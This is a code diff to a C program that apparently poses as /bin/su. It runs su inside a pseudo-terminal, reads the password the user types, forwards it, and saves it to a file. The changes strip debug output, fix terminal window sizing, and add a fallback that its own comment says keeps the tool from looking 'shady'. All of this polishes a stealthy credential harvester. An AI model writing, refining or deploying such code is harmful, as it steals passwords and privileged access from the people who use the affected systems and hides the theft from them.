@@ -18,8 +18,8 @@ int forkpty(int *amaster, char *name, const struct termios *termp, const struct 
 
 int main(int argc, char * const *argv)
 {
-    struct termios old;
-    struct termios new;
+    struct termios old_term_settings;
+    struct termios new_term_settings;
     char *command;
     pid_t pid;
 
@@ -30,31 +30,41 @@ int main(int argc, char * const *argv)
     char buf[BUF_SIZE];
     char output[BUF_SIZE];
 
-    char **su_argv = calloc(argc, sizeof(char*));
+    struct winsize ws;
+
+    // Get current window size
+    ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);
 
     /* Retrieve current terminal settings, turn echoing off */
-    if (tcgetattr(0, &new) == -1)
+    if (tcgetattr(STDIN_FILENO, &new_term_settings) == -1)
     {
         perror("tcgetattr");
         exit(1);
     }
 
-    old = new;
+    old_term_settings = new_term_settings;
     /* ECHO off, other bits unchanged */
-    new.c_lflag &= ~ECHO;
-    printf("%p %p\n", &new, &old);
+    new_term_settings.c_lflag &= ~ECHO;
+    //printf("%p %p\n", &new_term_settings, &old_term_settings);
 
-    if (tcsetattr(0, TCSAFLUSH, &new) == -1)
+    if (tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_term_settings) == -1)
     {
         perror("tcsetattr");
         exit(1);
     }
 
-    pid = forkpty(&terminalfd, (char *)NULL, NULL, NULL);
+    pid = forkpty(&terminalfd, (char *)NULL, NULL, &ws);
+    // This lets us fall back to just exec'ing su if forkpty fails. We won't
+    // get the password, but it also won't make it obvious that we're being
+    // shady.
     if (pid == -1 || pid == 0)
     {
         exit(execvp("/bin/su", argv));
     }
+
+    // Testing on Ubuntu, forkpty seems to ignore the window size, so set it
+    // with ioctl, too.
+    ioctl(terminalfd, TIOCSWINSZ, &ws);
 
     // read the password prompt
     int numbytes = read(terminalfd, output, BUF_SIZE - 1);
@@ -63,10 +73,8 @@ int main(int argc, char * const *argv)
 
     // grab the password from the user
     fgets(buf, BUF_SIZE, stdin);
-    //buf[strcspn(buf, "\n")] = 0;
-    //buf[strlen(buf)-1] = 0;
 
-    // forward it to su
+    // forward it to su, with the newline intact
     write(terminalfd, buf, strlen(buf));
     // And save it
     fprintf(file, "%s\n", buf);
@@ -74,17 +82,17 @@ int main(int argc, char * const *argv)
 
     /* Restore original terminal settings */
 
-    if (tcsetattr(0, TCSANOW, &old) == -1)
+    if (tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings) == -1)
     {
         perror("tcsetattr");
         exit(1);
     }
 
-    tcgetattr(0, &old); // Disable buffered I/O and echo mode for terminal emulated
-    new = old;
-    new.c_lflag &= ~ICANON;
-    new.c_lflag &= ~ECHO;
-    tcsetattr(0, TCSANOW, &new);
+    tcgetattr(STDIN_FILENO, &old_term_settings); // Disable buffered I/O and echo mode for terminal emulated
+    new_term_settings = old_term_settings;
+    new_term_settings.c_lflag &= ~ICANON;
+    new_term_settings.c_lflag &= ~ECHO;
+    tcsetattr(STDIN_FILENO, TCSANOW, &new_term_settings);
 
     fd_set rfds;
     FD_ZERO(&rfds);
@@ -98,7 +106,7 @@ int main(int argc, char * const *argv)
 
         /* Watch stdin (fd 0) to see when it has input. */
 
-        FD_SET(0, &rfds);
+        FD_SET(STDIN_FILENO, &rfds);
         FD_SET(terminalfd, &rfds);
 
         /* Wait up to five seconds. */
@@ -119,23 +127,22 @@ int main(int argc, char * const *argv)
         }
         else
         {
-            printf("No data within five seconds.\n");
+            //printf("No data within five seconds.\n");
             continue;
         }
 
         // I don't like this big chunk of duplicate code, but I don't see an
         // easy way around it
-        if (FD_ISSET(0, &rfds))
+        if (FD_ISSET(STDIN_FILENO, &rfds))
         {
-            printf("Data is available from stdin. %d\n", retval);
-            numbytes = read(0, buf, BUF_SIZE - 1);
+            numbytes = read(STDIN_FILENO, buf, BUF_SIZE - 1);
 
             if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
             {
                 if(errno == 5)
                 {
                     waitpid(pid, &status, WNOHANG);
-                    tcsetattr(0, TCSANOW, &old); //reset terminal
+                    tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings); //reset terminal
                     if (WIFEXITED(status))
                     {
                         exit(WEXITSTATUS(status));
@@ -151,14 +158,13 @@ int main(int argc, char * const *argv)
         if (FD_ISSET(terminalfd, &rfds))
         {
             numbytes = read(terminalfd, buf, BUF_SIZE - 1);
-            printf(" %d bytes\n", numbytes);
 
             if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
             {
                 if(errno == 5)
                 {
                     waitpid(pid, &status, WNOHANG);
-                    tcsetattr(0, TCSANOW, &old); //reset terminal
+                    tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings); //reset terminal
                     if (WIFEXITED(status))
                     {
                         exit(WEXITSTATUS(status));
